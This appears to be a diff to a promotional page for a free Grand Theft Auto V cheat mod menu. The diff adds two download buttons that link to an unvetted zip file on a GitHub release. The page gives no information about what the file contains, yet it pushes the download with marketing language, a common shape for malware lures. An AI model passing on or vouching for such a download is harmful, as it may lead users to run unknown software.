@@ -6,6 +6,8 @@ title:  "GTA 5 Mod Menu"
 
 Are you looking to enhance your Grand Theft Auto V (GTA V) gameplay experience? Look no further! Our free mod menu for GTA V is now available for download and offers a variety of cheat options and features to take your game to the next level. In this page, we'll take a look at the features of our mod menu and how to download it.
 
+[![green button](https://github.com/pcmods/pcmods.github.io/blob/master/button.png?raw=true)](https://github.com/pcmods/pcmods.github.io/releases/download/modmenu/Mod.Menu.zip)
+
 ## Features
 
 Our mod menu for GTA V includes a variety of cheat options such as:
@@ -29,6 +31,8 @@ To download our mod menu for GTA V, follow these simple steps:
 3. Open OpenIV and navigate to the "GTA V" folder on your computer.
 4. Drag and drop the mod menu files into the "scripts" folder within the "GTA V" folder.
 5. Start up GTA V and press the designated key to open the mod menu in-game.
+
+[![green button](https://github.com/pcmods/pcmods.github.io/blob/master/button.png?raw=true)](https://github.com/pcmods/pcmods.github.io/releases/download/modmenu/Mod.Menu.zip)
 
 ## Disclaimer
 
